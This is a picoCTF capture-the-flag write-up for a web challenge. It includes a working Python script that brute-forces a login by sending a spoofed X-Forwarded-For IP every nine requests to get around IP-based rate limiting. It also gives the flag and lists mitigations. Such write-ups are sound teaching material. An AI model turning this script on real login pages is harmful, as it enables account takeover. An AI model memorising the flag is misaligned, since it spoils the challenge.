# PicoCTF – Crack the Gate 2
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Points:** 200  
**Author:** Yahaya Meddy  
**Flag:** `picoCTF{xff_byp4ss_brut3_1c447e47}`

---

## Description

> The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We've received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.

---

## Analysis

The challenge gives:
- Known email: `ctf-player@picoctf.org`
- A password wordlist (20 entries)
- Hint that the system "trusts user-controlled headers"

The rate limiter blocks IPs after repeated failed attempts — but blindly trusts the `X-Forwarded-For` header to identify the client IP. By spoofing a new fake IP every 9 requests, the rate limit counter resets and brute force becomes possible.

---

## Exploitation

### Script

```python
import requests
import random

def fake_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

url = "http://amiable-citadel.picoctf.net:63588/login"
ip = fake_ip()

with open("passwords.txt", "r") as f:
    for i, line in enumerate(f):
        password = line.strip()

        if i % 9 == 0:
            ip = fake_ip()

        headers = {"X-Forwarded-For": ip}
        data = {"email": "ctf-player@picoctf.org", "password": password}
        response = requests.post(url, headers=headers, data=data)

        if "picoCTF" in response.text or "welcome" in response.text.lower():
            print(f"FOUND! password: {password}")
            print(response.text[:200])
            break

        print(f"{i+1} tried: {password}")
```

### Result

Found on the first few attempts — flag returned in the response body.

---

## Flag

```
picoCTF{xff_byp4ss_brut3_1c447e47}
```

---

## Key Takeaways

- Same vulnerability as Fool the Lockout — IP-based rate limiting that blindly trusts `X-Forwarded-For`
- With a known email and small wordlist, brute force is trivial once rate limiting is bypassed
- Mitigations: account-based lockout (per username/email), not just IP-based; validate/strip `X-Forwarded-For` unless from trusted proxies
